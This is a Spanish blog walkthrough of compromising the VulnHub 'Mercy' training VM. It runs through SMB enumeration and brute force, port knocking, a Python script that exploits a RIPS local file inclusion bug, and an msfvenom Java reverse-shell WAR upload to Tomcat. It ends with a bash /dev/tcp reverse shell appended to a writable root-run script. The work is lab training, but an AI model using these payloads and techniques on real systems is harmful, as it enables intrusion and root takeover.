---
layout: single
title: Mercy - VulnHub
excerpt: "En un escenario de pentesting en la máquina virtual 'Mercy' de Vulnhub, se explotó una vulnerabilidad de credenciales débiles en el servicio SMB. Una vez dentro, se obtuvieron datos de 'Knocking.conf' para acceder al puerto HTTP, donde se encontró una vulnerabilidad de inclusión de archivos locales (LFI) en RIPS. Esto permitió el acceso al archivo 'tomcat-users.xml' con credenciales de Tomcat, facilitando la escalada de privilegios a la cuenta 'root' debido a una mala configuración."
date: 2023-10-08
classes: wide
header:
  teaser: /assets/images/vulnhub-writeup-pinkys/logo_vulnhub.png
  teaser_home_page: true
categories:
  - vulnhub 
  - cxdxnt
tags:  
  - suid
  - rpcbind
  - mount
---
![](/assets/images/vulnhub-writeup-pinkys/logo_vulnhub.png)

Durante la evaluación de seguridad en la máquina virtual 'Mercy' de Vulnhub, se identificó una vulnerabilidad relacionada con credenciales débiles, lo cual permitió la autenticación en el servicio SMB (Samba). Una vez dentro del sistema SMB, se descubrió un archivo que contenía múltiples configuraciones, incluyendo datos de 'Knocking.conf'. Estos datos proporcionaron acceso al puerto HTTP, donde se identificó una vulnerabilidad de inclusión de archivos locales (LFI) en una aplicación RIPS. Aprovechando esta vulnerabilidad, se logró obtener acceso a un archivo llamado 'tomcat-users.xml', que contenía credenciales de inicio de sesión para el servicio Tomcat. Utilizando estas credenciales, se accedió exitosamente al sistema y posteriormente se logró la escalada de privilegios a la cuenta de administrador 'root', aprovechando una mala configuración presente en un archivo específico

## Enumeración

Empezamos con un reconocimiento de puertos y servicios a través de la herramienta nmap. En el cual logramos detectar varios servicios.

```bash
# Nmap 7.93 scan initiated Thu Oct 19 10:50:22 2023 as: nmap -sCV -p53,110,139,143,445,993,995,8080 -oN scanvuln.nmap 192.168.56.10
Nmap scan report for 192.168.56.10
Host is up (0.00057s latency).

PORT     STATE SERVICE     VERSION
53/tcp   open  domain      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.17-Ubuntu
110/tcp  open  pop3        Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: TOP RESP-CODES PIPELINING AUTH-RESP-CODE CAPA STLS SASL UIDL
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open  imap        Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: Pre-login LITERAL+ more have LOGIN-REFERRALS ID capabilities IMAP4rev1 STARTTLS post-login ENABLE listed OK LOGINDISABLEDA0001 SASL-IR IDLE
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
993/tcp  open  ssl/imaps?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
995/tcp  open  ssl/pop3s?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-08-24T13:22:55
|_Not valid after:  2028-08-23T13:22:55
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
| http-robots.txt: 1 disallowed entry 
|_/tryharder/tryharder
|_http-title: Apache Tomcat
| http-methods: 
|_  Potentially risky methods: PUT DELETE
MAC Address: 08:00:27:04:57:FD (Oracle VirtualBox virtual NIC)
Service Info: Host: MERCY; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -5h40m01s, deviation: 4h37m07s, median: -3h00m02s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-10-19T10:50:33
|_  start_date: N/A
|_nbstat: NetBIOS name: MERCY, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: mercy
|   NetBIOS computer name: MERCY\x00
|   Domain name: \x00
|   FQDN: mercy
|_  System time: 2023-10-19T18:50:33+08:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 19 10:50:46 2023 -- 1 IP address (1 host up) scanned in 23.74 seconds
```


## Analisis 

Nmap revela la presencia de un archivo robots.txt en el servidor web, que al ser accedido contiene una cadena en formato base64. Al descodificar esta cadena, se revela que múltiples usuarios del sistema están utilizando contraseñas débiles.


![](/assets/images/vulnhub-writeup-mercy/tryharder.png)


### Detección de usuarios.


```bash
rpcclient $> enumdomusers
user:[pleadformercy] rid:[0x3e8]
user:[fluffy] rid:[0x3ea]
user:[qiu] rid:[0x3e9]
rpcclient $> 

```


### En este escenario, se procedió a llevar a cabo un ataque de fuerza bruta.


![](/assets/images/vulnhub-writeup-mercy/hydra.png)


Después de iniciar sesión, se creó un montaje en el equipo local.


```bash
mount -t cifs //192.168.56.10/qiu /mnt/smb -o "username=qiu,password=password"
```


### Luego de la montura, se realizó una búsqueda de archivos y se encontró algo de interés.



```bash
➜  smb find . -type f                       
./.bashrc
./.public/resources/smiley
./.bash_history
./.cache/motd.legal-displayed
./.private/opensesame/configprint
./.private/opensesame/config
./.private/readme.txt
./.bash_logout
./.profile                               
➜  smb /usr/bin/cat ./.private/opensesame/config
Here are settings for your perusal.

Port Knocking Daemon Configuration

[options]
	UseSyslog

[openHTTP]
	sequence    = 159,27391,4
	seq_timeout = 100
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
	tcpflags    = syn

[closeHTTP]
	sequence    = 4,27391,159
	seq_timeout = 100
	command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
	tcpflags    = syn

[openSSH]
	sequence    = 17301,28504,9999
	seq_timeout = 100
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn

[closeSSH]
	sequence    = 9999,28504,17301
	seq_timeout = 100
	command     = /sbin/iptables -D iNPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn
```

### Knocking

El archivo knocking.conf proporciona información sobre cómo abrir el puerto HTTP; se debe "golpear" los puertos 159, 27391 y 4 en ese orden para lograrlo.

```bash
➜  smb knock -v 192.168.56.10 159 27391 4 -d 900
hitting tcp 192.168.56.10:159
hitting tcp 192.168.56.10:27391
hitting tcp 192.168.56.10:4
```

Correcto, siguiendo las instrucciones del archivo **knocking.conf** y golpeando los puertos en el orden indicado (159, 27391 y 4), se debería haber abierto el puerto HTTP y permitir el acceso a través de ese puerto.


```bash
➜  smb nmap -p80  192.168.56.10
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-20 04:25 -03
Nmap scan report for 192.168.56.10
Host is up (0.00025s latency).

PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:04:57:FD (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.25 seconds
```

Al acceder al puerto HTTP después de seguir las instrucciones del archivo knocking.conf, se detectó que el servidor tiene un archivo robots.txt.


![](/assets/images/vulnhub-writeup-mercy/robots.png)


Cuando nos dirigimos a la URL **/nomercy**, se identifica que el servidor está ejecutando ** RIPS 0.53 **, el cual presenta una vulnerabilidad de Inclusión de Archivos Locales (LFI).


![](/assets/images/vulnhub-writeup-mercy/lfi.png)


En la URL **http://192.168.56.10:8080/**, se identifica una fuga de información que proporciona detalles sobre la ubicación del archivo de configuración que contiene los usuarios y contraseñas del servicio Tomcat.


![](/assets/images/vulnhub-writeup-mercy/tomcat-password.png)


Se desarrolló un script para automatizar la lectura de archivos, aprovechando la fuga de información y la vulnerabilidad LFI en el servidor.


```python

import requests,sys,re,html

def lfi():
    url = "http://192.168.56.10/nomercy/windows/code.php?file=../../../../../.." + sys.argv[1]
    x = re.findall(r'<span class="phps-t-inline-html" >&lt;\?(.*?)\n',requests.get(url).text)
    for input_lfi in x:
        print(html.unescape(input_lfi))

if __name__ == "__main__":
    lfi()
```


Se procedió a utilizar el script para leer el archivo y extraer usuarios y contraseñas del servicio Tomcat.


![](/assets/images/vulnhub-writeup-mercy/script-lfi.png)


### Tomcat


Después de haber iniciado sesión en el servicio Tomcat, se creó un archivo WinRAR malicioso con el propósito de llevar a cabo una acción específica en el servidor.


```bash
msfvenom -p java/shell_reverse_tcp LHOST=192.168.56.1 LPORT=443 -f war -o cxshell.war 
```

Procedemos a subirlo.


![](/assets/images/vulnhub-writeup-mercy/upload-war.png)


Se configuró una escucha con pwncat-cs -lp 443 y se utilizó pwncat-cs para obtener una TTY completa, ya que la manipulación manual causaba problemas en la máquina víctima. Una vez que la conexión se estableció, se tuvo que presionar Ctrl + D para ejecutar comandos en la máquina víctima.

![](/assets/images/vulnhub-writeup-mercy/pwcat.png)


Una vez logueados como "fluffy" utilizando credenciales reutilizadas, se exploró su directorio y se encontró un archivo interesante.

```bash
fluffy@MERCY:~/.private/secrets$ ls -la
total 20
drwxr-xr-x 2 fluffy fluffy 4096 Nov 20  2018 .
drwxr-xr-x 3 fluffy fluffy 4096 Nov 20  2018 ..
-rwxr-xr-x 1 fluffy fluffy   37 Nov 20  2018 backup.save
-rw-r--r-- 1 fluffy fluffy   12 Nov 20  2018 .secrets
-rwxrwxrwx 1 root   root     96 Oct 20 21:23 timeclock
fluffy@MERCY:~/.private/secrets$ 
```

Se introdujo una reverse shell en la máquina para mantener acceso y control remoto.

```bash
fluffy@MERCY:~/.private/secrets$ echo "bash -i >& /dev/tcp/192.168.56.1/443 0>&1" >> timeclock 
fluffy@MERCY:~/.private/secrets$ 
```

## ROOT :)!

![](/assets/images/vulnhub-writeup-mercy/root.png)


